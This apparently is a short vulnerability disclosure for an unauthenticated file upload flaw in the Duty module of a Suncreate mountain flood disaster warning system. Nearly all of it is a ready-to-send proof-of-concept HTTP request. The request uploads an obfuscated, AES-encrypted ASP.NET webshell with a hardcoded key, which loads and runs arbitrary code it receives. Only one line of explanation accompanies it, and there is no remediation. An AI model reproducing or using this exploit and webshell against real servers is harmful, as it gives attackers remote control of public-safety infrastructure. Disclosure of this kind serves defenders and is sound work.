Suncreate Technology Co., Ltd.-Duty module of mountain flood disaster prevention monitoring and early warning system has file upload vulnerability

official website：https://www.istrong.cn/

poc
```
POST /Duty/AjaxHandle/UploadHandler.ashx HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 1410
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB4tZ2o9YRDmhPXe7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="doc"

/
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="filetype"

1
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="ParentID"

1
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="Filedata"; filename="api.aspx"
Content-Type: application/xml

<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.IO"%>
<%@Import Namespace="System.Security.Cryptography"%>
<%
    try {
        string key = "900bc885d7553375";
        byte[] k = Encoding.Default.GetBytes(key);
        Session.Add("sky", key);
        StreamReader sr = new StreamReader(Request.InputStream);
        string line = sr.ReadLine();
        if (!string.IsNullOrEmpty(line))
        {

            byte[] c = Convert.FromBase64String(line);
            Assembly assembly = typeof(Environment).Assembly;
            RijndaelManaged rm =(RijndaelManaged) assembly.CreateInstance("System.Secur"+"ity.Crypto"+"graphy.Rijnda"+"elManaged");
            byte[] data=rm.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length);
            Assembly.Load(data).CreateInstance("U").Equals(this.Context);
            sr.Close();
        }
    }
    catch{ }

%>
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7--
```

Upload webshell directly without authorization

![WPS图片(1)](https://github.com/luoshaokai/cve/assets/138547607/d0b926e2-9c0d-41f3-b0f8-5d200baf79b6)
![WPS图片(2)](https://github.com/luoshaokai/cve/assets/138547607/203b57e8-529b-45cb-9e1c-4d08ba294fa7)

